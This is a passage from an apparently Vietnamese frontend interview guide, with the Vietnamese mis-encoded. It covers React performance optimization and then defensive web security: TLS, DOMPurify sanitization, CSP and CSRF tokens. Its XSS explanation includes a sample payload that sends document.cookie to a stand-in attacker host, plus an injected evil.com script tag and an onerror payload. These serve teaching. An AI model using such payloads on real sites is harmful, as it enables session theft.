  // âœ… Tree-shaking: Loáº¡i bá» code khÃ´ng dÃ¹ng Ä‘áº¿n
  // VD: import { map } from 'lodash' â†’ chá»‰ bundle hÃ m map, bá» 99% lodash
  optimizeDeps: {
    include: ['react', 'react-dom'], // Pre-bundle cÃ¡c deps quan trá»ng
  },
});

// ğŸ“¦ B. Lazy Loading Routes (Táº£i Trang Theo Route)
// Giáº£i thÃ­ch: Thay vÃ¬ load toÃ n bá»™ app lÃºc Ä‘áº§u, chá»‰ load trang user cáº§n
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

// âœ… Lazy load pages: Táº¡o dynamic import â†’ táº¡o separate chunk cho má»—i page
// VD: User vÃ o "/" â†’ chá»‰ táº£i Dashboard.js, KHÃ”NG táº£i Trading.js, Portfolio.js
// Káº¿t quáº£: Initial bundle giáº£m tá»« 2.5MB â†’ 300KB
const Dashboard = lazy(() => import('./pages/Dashboard')); // Táº£i khi vÃ o "/"
const Trading = lazy(() => import('./pages/Trading')); // Táº£i khi vÃ o "/trading"
const Portfolio = lazy(() => import('./pages/Portfolio')); // Táº£i khi vÃ o "/portfolio"
const Analytics = lazy(() => import('./pages/Analytics')); // Táº£i khi vÃ o "/analytics"

// Skeleton Loader: UI hiá»ƒn thá»‹ trong lÃºc chá» page load
// Tá»‘t hÆ¡n lÃ  mÃ n hÃ¬nh tráº¯ng (UX tá»‘t hÆ¡n)
const PageLoader = () => (
  <div className="flex items-center justify-center h-screen">
    {/* Spinner animation quay trÃ²n */}
    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
    <span className="ml-3">Äang táº£i...</span>
  </div>
);

export default function App() {
  return (
    // Suspense: Báº¯t loading state cá»§a lazy components
    // fallback: Component hiá»ƒn thá»‹ trong lÃºc chá» load
    <Suspense fallback={<PageLoader />}>
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/trading" element={<Trading />} />
        <Route path="/portfolio" element={<Portfolio />} />
        <Route path="/analytics" element={<Analytics />} />
      </Routes>
    </Suspense>
  );
}

// ============================================
// 3ï¸âƒ£ RENDERING OPTIMIZATION (Tá»I Æ¯U RENDER)
// ============================================

// ğŸ¨ A. React.memo + useMemo + useCallback (Bá»™ 3 tá»‘i Æ°u render)
import { memo, useMemo, useCallback } from 'react';

// âœ… React.memo: Bá»c component Ä‘á»ƒ SKIP re-render náº¿u props khÃ´ng Ä‘á»•i
// Hoáº¡t Ä‘á»™ng: React so sÃ¡nh props cÅ© vs má»›i (shallow comparison)
// â†’ Náº¿u giá»‘ng nhau â†’ KHÃ”NG re-render â†’ TÄƒng performance
const OrderItem = memo(function OrderItem({ order, onDelete }) {
  console.log('OrderItem render'); // Log nÃ y CHá»ˆ cháº¡y khi props thay Ä‘á»•i
  return (
    <div>
      <span>{order.symbol}</span>
      <button onClick={() => onDelete(order.id)}>XÃ³a</button>
    </div>
  );
});
// Káº¿t quáº£: 1000 orders â†’ parent re-render â†’ KHÃ”NG re-render 1000 OrderItem

// Component cha
function OrderList({ orders }) {
  // âœ… useCallback: LÆ°u láº¡i function reference
  // Váº¥n Ä‘á»: Má»—i láº§n render â†’ táº¡o function má»›i â†’ OrderItem re-render vÃ¬ onDelete khÃ¡c
  // Giáº£i phÃ¡p: useCallback lÆ°u function â†’ reference giá»‘ng nhau â†’ OrderItem KHÃ”NG re-render
  const handleDelete = useCallback((id: string) => {
    console.log('XÃ³a order:', id);
    // Call API xÃ³a order...
  }, []); // [] = function khÃ´ng Ä‘á»•i, táº¡o 1 láº§n duy nháº¥t

  // âœ… useMemo: Cache káº¿t quáº£ tÃ­nh toÃ¡n náº·ng
  // Váº¥n Ä‘á»: Má»—i render â†’ sort láº¡i 10,000 orders â†’ cháº­m
  // Giáº£i phÃ¡p: useMemo cache káº¿t quáº£ â†’ chá»‰ sort láº¡i KHI orders thay Ä‘á»•i
  const sortedOrders = useMemo(() => {
    console.log('Äang sort orders...'); // Chá»‰ log khi orders thay Ä‘á»•i
    return orders.sort((a, b) => b.timestamp - a.timestamp); // Sort theo thá»i gian má»›i nháº¥t
  }, [orders]); // [orders] = chá»‰ tÃ­nh láº¡i khi orders thay Ä‘á»•i

  return (
    <div>
      {sortedOrders.map((order) => (
        <OrderItem
          key={order.id} // key giÃºp React track item nÃ o thay Ä‘á»•i
          order={order}
          onDelete={handleDelete} // Reference giá»‘ng nhau â†’ memo hoáº¡t Ä‘á»™ng
        />
      ))}
    </div>
  );
}
// Káº¿t quáº£: Re-render chá»‰ máº¥t 20ms thay vÃ¬ 500ms

// ğŸ¨ B. Virtual Scrolling (Cuá»™n áº¢o cho 10K+ items)
// Giáº£i thÃ­ch: Thay vÃ¬ render 10,000 items â†’ chá»‰ render items hiá»ƒn thá»‹ trÃªn mÃ n hÃ¬nh
// VD: MÃ n hÃ¬nh cao 600px, má»—i item 50px â†’ chá»‰ render 12 items (600/50)
import { FixedSizeList as List } from 'react-window';

interface Order {
  id: string;
  symbol: string;
  quantity: number;
  price: number;
}

function GoodOrderList({ orders }: { orders: Order[] }) {
  // Row component: Render 1 order item
  // Nháº­n index + style tá»« react-window (style cÃ³ position: absolute + top)
  const Row = ({ index, style }) => {
    const order = orders[index]; // Láº¥y order theo index
    return (
      // style chá»©a position absolute + top Ä‘á»ƒ Ä‘áº·t item Ä‘Ãºng vá»‹ trÃ­
      <div style={style} className="flex items-center border-b px-4">
        <span className="w-20 font-bold">{order.symbol}</span>
        <span className="w-32">
          {order.quantity} @ ${order.price}
        </span>
      </div>
    );
  };

  return (
    // FixedSizeList: Component virtual scrolling
    // Hoáº¡t Ä‘á»™ng: TÃ­nh toÃ¡n item nÃ o trong viewport â†’ chá»‰ render items Ä‘Ã³
    <List
      height={600} // Chiá»u cao container (px)
      itemCount={orders.length} // Tá»•ng sá»‘ items (10,000)
      itemSize={50} // Chiá»u cao má»—i item (px)
      width="100%" // Chiá»u rá»™ng container
    >
      {Row} {/* Render function cho má»—i item */}
    </List>
  );
}
// Káº¿t quáº£:
// âŒ KhÃ´ng dÃ¹ng virtual scroll: Render 10,000 DOM nodes â†’ lag, FPS 15
// âœ… DÃ¹ng virtual scroll: Chá»‰ render ~12 DOM nodes â†’ mÆ°á»£t, FPS 60

// ============================================
// 4ï¸âƒ£ STATE MANAGEMENT OPTIMIZATION (Tá»I Æ¯U QUáº¢N LÃ STATE)
// ============================================

// ğŸª Zustand: ThÆ° viá»‡n state management nháº¹, nhanh hÆ¡n Redux
// Æ¯u Ä‘iá»ƒm:
// - KhÃ´ng cáº§n Provider wrapper
// - Selective subscription (chá»‰ subscribe state cáº§n thiáº¿t)
// - API Ä‘Æ¡n giáº£n, Ã­t boilerplate
import create from 'zustand';

interface Order {
  id: string;
  symbol: string;
  quantity: number;
  price: number;
}

interface TradingStore {
  orders: Order[]; // Danh sÃ¡ch orders
  prices: Record<string, number>; // GiÃ¡ real-time
  addOrder: (order: Order) => void;
  updatePrice: (symbol: string, price: number) => void;
}

// Táº¡o store: HÃ m nháº­n set function Ä‘á»ƒ update state
const useTradingStore = create<TradingStore>((set) => ({
  orders: [],
  prices: {},

  // Action thÃªm order
  addOrder: (order) =>
    set((state) => ({
      orders: [...state.orders, order], // Immutable update
    })),

  // Action update giÃ¡
  updatePrice: (symbol, price) =>
    set((state) => ({
      prices: { ...state.prices, [symbol]: price },
    })),
}));

// âœ… Selective Subscription: Chá»‰ subscribe pháº§n state cáº§n thiáº¿t
// Component nÃ y CHá»ˆ re-render khi orders thay Ä‘á»•i
// Khi prices update â†’ component KHÃ”NG re-render (vÃ¬ khÃ´ng subscribe prices)
function OrderList() {
  // Selector function: state => state.orders
  // Zustand compare selector result â†’ chá»‰ re-render náº¿u orders thay Ä‘á»•i
  const orders = useTradingStore((state) => state.orders);

  return (
    <div>
      {orders.map((order) => (
        <OrderItem key={order.id} order={order} />
      ))}
    </div>
  );
}

// Component nÃ y CHá»ˆ re-render khi prices thay Ä‘á»•i
function PriceDisplay({ symbol }: { symbol: string }) {
  // Subscribe chá»‰ 1 giÃ¡ cá»¥ thá»ƒ
  const price = useTradingStore((state) => state.prices[symbol]);

  return (
    <span>
      GiÃ¡ {symbol}: ${price}
    </span>
  );
}
// Káº¿t quáº£: WebSocket update 100 giÃ¡/giÃ¢y â†’ chá»‰ 100 components nhá» re-render
// Thay vÃ¬ toÃ n bá»™ app re-render (nhÆ° Context API)

// ============================================
// 5ï¸âƒ£ MEMORY MANAGEMENT (QUáº¢N LÃ Bá»˜ NHá»š)
// ============================================

// ğŸ§¹ Cleanup useEffect: Dá»n dáº¹p resources khi component unmount
// Váº¥n Ä‘á»: KhÃ´ng cleanup â†’ memory leak (bá»™ nhá»› tÄƒng dáº§n 50MB â†’ 500MB)

import { useEffect, useState, useRef } from 'react';

function TradingChart() {
  const [chartData, setChartData] = useState([]);

  useEffect(() => {
    // Táº¡o WebSocket connection
    const ws = new WebSocket('wss://api.trading.com');

    // Láº¯ng nghe data tá»« server
    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      setChartData((prev) => [...prev, data]); // Update chart data
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };

    // âœ… QUAN TRá»ŒNG: Cleanup function
    // Cháº¡y khi component unmount hoáº·c dependencies thay Ä‘á»•i
    return () => {
      console.log('Dá»n dáº¹p WebSocket...');

      // ÄÃ³ng WebSocket connection
      if (
        ws.readyState === WebSocket.OPEN ||
        ws.readyState === WebSocket.CONNECTING
      ) {
        ws.close(); // Ngáº¯t káº¿t ná»‘i â†’ giáº£i phÃ³ng memory
      }

      // Náº¿u khÃ´ng cleanup:
      // - WebSocket váº«n má»Ÿ â†’ nháº­n data â†’ update state cá»§a component Ä‘Ã£ unmount
      // - GÃ¢y memory leak + warning "Can't perform state update on unmounted component"
    };
  }, []); // [] = chá»‰ cháº¡y 1 láº§n khi mount

  return <div>Biá»ƒu Ä‘á»“ trading...</div>;
}

// ğŸ§¹ B. Cancel API Requests vá»›i AbortController
function OrderHistory() {
  const [orders, setOrders] = useState([]);

  useEffect(() => {
    // Táº¡o AbortController Ä‘á»ƒ cancel request
    const abortController = new AbortController();
    const signal = abortController.signal;

    // Fetch data vá»›i signal
    fetch('/api/orders?limit=1000', { signal })
      .then((res) => res.json())
      .then((data) => setOrders(data))
      .catch((error) => {
        // AbortError = request bá»‹ cancel (KHÃ”NG pháº£i lá»—i tháº­t)
        if (error.name === 'AbortError') {
          console.log('Request Ä‘Ã£ Ä‘Æ°á»£c cancel');
        } else {
          console.error('Lá»—i:', error);
        }
      });

    // âœ… Cleanup: Cancel request khi unmount
    return () => {
      console.log('Cancel API request...');
      abortController.abort(); // Cancel request Ä‘ang cháº¡y

      // Táº¡i sao cáº§n cancel?
      // - User chuyá»ƒn trang nhanh â†’ request cÅ© váº«n cháº¡y â†’ waste bandwidth
      // - Request tráº£ vá» â†’ update state unmounted component â†’ memory leak
    };
  }, []);

  return <div>Lá»‹ch sá»­ orders...</div>;
}

// ğŸ§¹ C. Clear Timers & Intervals
function PriceRefresh() {
  const [price, setPrice] = useState(0);

  useEffect(() => {
    // Refresh giÃ¡ má»—i 5 giÃ¢y
    const intervalId = setInterval(() => {
      fetch('/api/price')
        .then((res) => res.json())
        .then((data) => setPrice(data.price));
    }, 5000);

    // âœ… Cleanup: Clear interval khi unmount
    return () => {
      console.log('Clear interval...');
      clearInterval(intervalId); // Dá»«ng interval

      // Náº¿u khÃ´ng clear:
      // - Interval váº«n cháº¡y sau unmount â†’ call API â†’ update state
      // - Memory leak + nhiá»u intervals cháº¡y song song
    };
  }, []);

  return <div>GiÃ¡ hiá»‡n táº¡i: ${price}</div>;
}

// ğŸ§¹ D. Remove Event Listeners
function ResizableChart() {
  const chartRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Handler cho window resize
    const handleResize = () => {
      if (chartRef.current) {
        // Resize chart khi window thay Ä‘á»•i
        console.log('Resize chart to:', window.innerWidth);
      }
    };

    // ÄÄƒng kÃ½ event listener
    window.addEventListener('resize', handleResize);

    // âœ… Cleanup: Remove event listener
    return () => {
      console.log('Remove resize listener...');
      window.removeEventListener('resize', handleResize);

      // Náº¿u khÃ´ng remove:
      // - Listener váº«n tá»“n táº¡i sau unmount
      // - Nhiá»u components â†’ nhiá»u listeners â†’ performance giáº£m
      // - Memory leak (function + closure khÃ´ng Ä‘Æ°á»£c garbage collected)
    };
  }, []);

  return <div ref={chartRef}>Chart cÃ³ thá»ƒ resize</div>;
}
// Káº¿t quáº£ cleanup Ä‘Ãºng cÃ¡ch: Memory á»•n Ä‘á»‹nh ~80MB thay vÃ¬ leak Ä‘áº¿n 500MB
```

**ğŸ¯ Káº¿t Quáº£ Sau Optimization:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           PERFORMANCE METRICS - BEFORE vs AFTER                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Metric              â”‚ Before      â”‚ After       â”‚ Improvement â”‚
â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚
â”‚  Initial Load        â”‚ 5-7s        â”‚ 1.5-2s      â”‚ 70% faster  â”‚
â”‚  Bundle Size         â”‚ 2.5MB       â”‚ 450KB       â”‚ 82% smaller â”‚
â”‚  FCP (First Paint)   â”‚ 3s          â”‚ 0.8s        â”‚ 73% faster  â”‚
â”‚  TTI (Interactive)   â”‚ 6s          â”‚ 2s          â”‚ 67% faster  â”‚
â”‚  Scroll FPS          â”‚ 15 FPS      â”‚ 60 FPS      â”‚ 4x better   â”‚
â”‚  Memory Usage        â”‚ 500MB       â”‚ 80MB        â”‚ 84% less    â”‚
â”‚  Re-renders/sec      â”‚ 200+        â”‚ 10-20       â”‚ 90% less    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Best Practices:**

1. **Measure First**: DÃ¹ng Lighthouse, Chrome DevTools Performance
2. **Bundle Analysis**: `npm run build -- --analyze`
3. **Code Splitting**: Route-level + Component-level
4. **State Management**: Context cho static, Zustand cho complex state
5. **Memory Management**: Always cleanup useEffect

**Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: Inline functions trong render
// Váº¥n Ä‘á»: Má»—i render táº¡o function má»›i â†’ child component re-render khÃ´ng cáº§n thiáº¿t
{
  items.map((item) => (
    <Item
      key={item.id}
      onClick={() => handleClick(item)} // âŒ Function má»›i má»—i láº§n render
    />
  ));
}

// âœ… CÃCH Sá»¬A: DÃ¹ng useCallback Ä‘á»ƒ memoize function
const handleClick = useCallback((item) => {
  console.log('Clicked:', item);
  // Xá»­ lÃ½ logic...
}, []); // Function reference khÃ´ng Ä‘á»•i

{
  items.map((item) => (
    <Item
      key={item.id}
      onClick={handleClick} // âœ… Reference giá»‘ng nhau â†’ khÃ´ng re-render
      item={item}
    />
  ));
}

// âŒ Lá»–I 2: KhÃ´ng cleanup useEffect â†’ Memory Leak
useEffect(() => {
  const ws = new WebSocket('wss://api.example.com');
  ws.onmessage = (e) => setData(e.data);
  // âŒ Thiáº¿u cleanup â†’ WebSocket khÃ´ng Ä‘Ã³ng â†’ memory leak
}, []);

// âœ… CÃCH Sá»¬A: LuÃ´n cleanup resources
useEffect(() => {
  const ws = new WebSocket('wss://api.example.com');
  ws.onmessage = (e) => setData(e.data);

  return () => {
    ws.close(); // âœ… ÄÃ³ng WebSocket khi unmount
  };
}, []);

// âŒ Lá»–I 3: QuÃªn dependencies trong useMemo/useCallback
const sortedData = useMemo(() => {
  return data.sort((a, b) => a[sortBy] - b[sortBy]);
}, []); // âŒ Thiáº¿u [data, sortBy] â†’ khÃ´ng update khi data/sortBy thay Ä‘á»•i

// âœ… CÃCH Sá»¬A: Khai bÃ¡o Ä‘áº§y Ä‘á»§ dependencies
const sortedData = useMemo(() => {
  return data.sort((a, b) => a[sortBy] - b[sortBy]);
}, [data, sortBy]); // âœ… TÃ­nh láº¡i khi data hoáº·c sortBy thay Ä‘á»•i

// âŒ Lá»–I 4: Render toÃ n bá»™ list lá»›n
function OrderList({ orders }) {
  return (
    <div>
      {orders.map((order) => (
        <OrderRow key={order.id} order={order} />
      ))}
    </div>
  );
} // âŒ 10,000 items â†’ 10,000 DOM nodes â†’ lag

// âœ… CÃCH Sá»¬A: DÃ¹ng virtual scrolling
import { FixedSizeList } from 'react-window';

function OrderList({ orders }) {
  return (
    <FixedSizeList height={600} itemCount={orders.length} itemSize={50}>
      {({ index, style }) => (
        <div style={style}>
          <OrderRow order={orders[index]} />
        </div>
      )}
    </FixedSizeList>
  );
} // âœ… Chá»‰ render ~12 items â†’ mÆ°á»£t mÃ 
```

---
</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ” Q51: Báº£o Máº­t Security trÃªn Web Application</span></summary>


**â“ TÃ¬nh Huá»‘ng:**

Báº¡n lÃ  Senior Frontend Developer phá»¥ trÃ¡ch security cho Trading Platform xá»­ lÃ½:

- **Sensitive Data**: User credentials, trading orders, financial transactions
- **API Calls**: 1000+ requests/minute Ä‘áº¿n backend APIs
- **User Input**: Form submissions, search queries, comments
- **Third-party Integration**: Payment gateways, analytics, CDN

**Threats (Má»‘i Ä‘e dá»a):**

- XSS attacks (inject malicious scripts)
- CSRF attacks (force unwanted actions)
- Man-in-the-Middle (intercept data)
- Session hijacking
- Data exposure in client-side code

**YÃªu cáº§u:** Thiáº¿t káº¿ vÃ  implement chiáº¿n lÆ°á»£c báº£o máº­t toÃ n diá»‡n (defense in depth).

**âœ… ÄÃ¡p Ãn Chi Tiáº¿t:**

**ğŸ›¡ï¸ 7 Táº§ng Báº£o Máº­t (7-Layer Security Strategy):**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              WEB SECURITY LAYERS                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1ï¸âƒ£ HTTPS + TLS (Transport Layer Security)                  â”‚
â”‚  2ï¸âƒ£ XSS Prevention (Cross-Site Scripting)                   â”‚
â”‚  3ï¸âƒ£ CSRF Protection (Cross-Site Request Forgery)            â”‚
â”‚  4ï¸âƒ£ Authentication & Authorization                          â”‚
â”‚  5ï¸âƒ£ Secure Storage                                          â”‚
â”‚  6ï¸âƒ£ API Security                                            â”‚
â”‚  7ï¸âƒ£ Security Headers                                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Code Example (TypeScript + React):**

```typescript
// ============================================
// 1ï¸âƒ£ HTTPS + TLS (Báº¢O Máº¬T Táº¦NG TRUYá»€N Táº¢I)
// ============================================

// Giáº£i thÃ­ch: HTTPS mÃ£ hÃ³a dá»¯ liá»‡u giá»¯a browser â†” server
// NgÄƒn Man-in-the-Middle attack (hacker khÃ´ng Ä‘á»c Ä‘Æ°á»£c data)

// Cáº¥u hÃ¬nh Nginx Server
server {
  listen 443 ssl http2;  // Port 443 = HTTPS, http2 = protocol má»›i nhanh hÆ¡n

  # HSTS (HTTP Strict Transport Security): Báº¯t buá»™c dÃ¹ng HTTPS
  # Giáº£i thÃ­ch: Browser tá»± Ä‘á»™ng chuyá»ƒn HTTP â†’ HTTPS trong 1 nÄƒm
  # includeSubDomains: Ãp dá»¥ng cho táº¥t cáº£ subdomain (api.example.com, cdn.example.com)
  # preload: ÄÆ°a vÃ o HSTS preload list cá»§a browser (báº£o máº­t tá»« láº§n truy cáº­p Ä‘áº§u)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

  # Cáº¥u hÃ¬nh SSL/TLS Certificate (Chá»©ng chá»‰ báº£o máº­t)
  ssl_certificate /path/to/cert.pem;          # Public certificate (chá»©ng chá»‰ cÃ´ng khai)
  ssl_certificate_key /path/to/key.pem;       # Private key (khÃ³a bÃ­ máº­t)

  # Chá»‰ cho phÃ©p TLS 1.2 vÃ  1.3 (phiÃªn báº£n má»›i, báº£o máº­t)
  # KhÃ´ng dÃ¹ng TLS 1.0, 1.1 (Ä‘Ã£ lá»—i thá»i, cÃ³ lá»— há»•ng)
  ssl_protocols TLSv1.2 TLSv1.3;

  # Cipher suite: Thuáº­t toÃ¡n mÃ£ hÃ³a
  # HIGH = mÃ£ hÃ³a máº¡nh, !aNULL = khÃ´ng dÃ¹ng cipher khÃ´ng xÃ¡c thá»±c, !MD5 = khÃ´ng dÃ¹ng MD5 (yáº¿u)
  ssl_ciphers HIGH:!aNULL:!MD5;
}

// ============================================
// 2ï¸âƒ£ XSS PREVENTION (NGÄ‚N CHáº¶N Táº¤N CÃ”NG XSS)
// ============================================

// Giáº£i thÃ­ch XSS (Cross-Site Scripting):
// Hacker inject malicious script vÃ o web â†’ script cháº¡y â†’ steal cookies, redirect, keylog
// VD: User nháº­p comment: <script>fetch('https://hacker.com?cookie='+document.cookie)</script>

// ğŸ›¡ï¸ A. Input Sanitization (LÃ m Sáº¡ch Input) vá»›i DOMPurify
import DOMPurify from 'dompurify';
import { useState, useMemo } from 'react';

function CommentForm({ onSubmit }) {
  const [comment, setComment] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // âœ… Sanitize input: Loáº¡i bá» script tags vÃ  cÃ¡c tháº» nguy hiá»ƒm
    const sanitized = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // Chá»‰ cho phÃ©p cÃ¡c tháº» an toÃ n
      ALLOWED_ATTR: ['href']  // Chá»‰ cho phÃ©p attribute 'href' (cho tháº» <a>)
    });
    // Káº¿t quáº£: "<script>alert('xss')</script>" â†’ "" (bá»‹ xÃ³a)
    //          "<b>Text</b>" â†’ "<b>Text</b>" (giá»¯ láº¡i)

    onSubmit(sanitized);
  };

  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        placeholder="Nháº­p comment cá»§a báº¡n..."
      />
      <button type="submit">Gá»­i Comment</button>
    </form>
  );
}

// âœ… Safe Display: Hiá»ƒn thá»‹ HTML an toÃ n
function SafeComment({ content }) {
  // useMemo: Chá»‰ sanitize láº¡i khi content thay Ä‘á»•i
  const sanitized = useMemo(() => {
    return DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // Cho phÃ©p format text cÆ¡ báº£n
      ALLOWED_ATTR: ['href', 'target'],  // Cho phÃ©p link
      ALLOW_DATA_ATTR: false  // KhÃ´ng cho phÃ©p data-* attributes (cÃ³ thá»ƒ chá»©a script)
    });
  }, [content]);

  // dangerouslySetInnerHTML: Render HTML string
  // TÃªn "dangerous" nháº¯c nhá»Ÿ pháº£i sanitize trÆ°á»›c khi dÃ¹ng
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// âŒ VÃ Dá»¤ Táº¤N CÃ”NG XSS:
// User nháº­p: <img src="x" onerror="alert('XSS')">
// KhÃ´ng sanitize â†’ img load lá»—i â†’ cháº¡y onerror â†’ alert hiá»‡n
// CÃ³ sanitize â†’ DOMPurify xÃ³a onerror attribute â†’ an toÃ n

// ğŸ›¡ï¸ B. Content Security Policy (CSP) - ChÃ­nh sÃ¡ch báº£o máº­t ná»™i dung
// CSP: Header chá»‰ Ä‘á»‹nh nguá»“n nÃ o Ä‘Æ°á»£c phÃ©p load scripts, styles, images
// Server: Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",  // Máº·c Ä‘á»‹nh chá»‰ load tá»« cÃ¹ng domain
      "script-src 'self' https://trusted-cdn.com",  // Script chá»‰ tá»« domain + CDN tin cáº­y
      "style-src 'self' 'unsafe-inline'",  // CSS tá»« domain + inline styles (cáº§n cho React)
      "img-src 'self' data: https:",  // Image tá»« domain + data URLs + HTTPS
      "connect-src 'self' https://api.example.com",  // Fetch/WebSocket chá»‰ Ä‘áº¿n API
      "frame-ancestors 'none'"  // KhÃ´ng cho embed trong iframe (chá»‘ng clickjacking)
    ].join('; ')
  );
  next();
});
// Káº¿t quáº£: Náº¿u hacker inject <script src="https://evil.com/hack.js"></script>
// â†’ Browser BLOCK vÃ¬ evil.com khÃ´ng trong whitelist â†’ XSS tháº¥t báº¡i

// ============================================
// 3ï¸âƒ£ CSRF PROTECTION (NGÄ‚N CHáº¶N Táº¤N CÃ”NG CSRF)
// ============================================

// Giáº£i thÃ­ch CSRF (Cross-Site Request Forgery):
// Hacker lá»«a user click link â†’ browser tá»± Ä‘á»™ng gá»­i request (kÃ¨m cookies) â†’ thá»±c hiá»‡n action khÃ´ng mong muá»‘n
// VD: User Ä‘ang login bank.com â†’ click link evil.com â†’ evil.com trigger POST /transfer â†’ tiá»n bá»‹ chuyá»ƒn

import { useEffect, useState } from 'react';
import { randomBytes } from 'crypto';

// SERVER: Generate CSRF Token
// Táº¡o token ngáº«u nhiÃªn cho má»—i session, lÆ°u á»Ÿ server
app.get('/api/csrf-token', (req, res) => {
  // Táº¡o token ngáº«u nhiÃªn 32 bytes (256 bits) â†’ ráº¥t khÃ³ Ä‘oÃ¡n
  const token = randomBytes(32).toString('hex');

  // LÆ°u token vÃ o session (server-side, hacker khÃ´ng access Ä‘Æ°á»£c)
  req.session.csrfToken = token;

  // Tráº£ token cho client
  res.json({ csrfToken: token });
});

// API endpoint cáº§n báº£o vá»‡
app.post('/api/transfer', (req, res) => {
  const { csrfToken, amount, toAccount } = req.body;

  // âœ… Verify CSRF token: So sÃ¡nh token tá»« client vs token trong session
  if (csrfToken !== req.session.csrfToken) {
    console.log('âŒ CSRF token khÃ´ng há»£p lá»‡');
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Token há»£p lá»‡ â†’ xá»­ lÃ½ transfer
  console.log(`âœ… Chuyá»ƒn $${amount} Ä‘áº¿n ${toAccount}`);
  // Process transfer logic...
  res.json({ success: true });
});

// CLIENT: Hook láº¥y CSRF token
function useCsrfToken() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // Fetch token tá»« server khi component mount
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken))
      .catch(err => console.error('Lá»—i láº¥y CSRF token:', err));
  }, []);

  return csrfToken;
}

// Component Form chuyá»ƒn tiá»n
function TransferForm() {
  const csrfToken = useCsrfToken();  // Láº¥y token
  const [amount, setAmount] = useState('');
  const [toAccount, setToAccount] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // âœ… Gá»­i CSRF token cÃ¹ng request
    // CÃ¡ch 1: Trong body
    // CÃ¡ch 2: Trong custom header (X-CSRF-Token)
    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken  // Gá»­i token qua header
      },
      body: JSON.stringify({
        amount,
        toAccount,
        csrfToken  // CÅ©ng gá»­i trong body (double check)
      })
    });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Sá»‘ tiá»n"
      />
      <input
        type="text"
        value={toAccount}
        onChange={(e) => setToAccount(e.target.value)}
        placeholder="TÃ i khoáº£n nháº­n"
      />
      <button type="submit">Chuyá»ƒn Tiá»n</button>
    </form>
  );
}

// Táº I SAO CSRF TOKEN HOáº T Äá»˜NG?
// 1. Site evil.com KHÃ”NG thá»ƒ Ä‘á»c token tá»« bank.com (Same-Origin Policy)
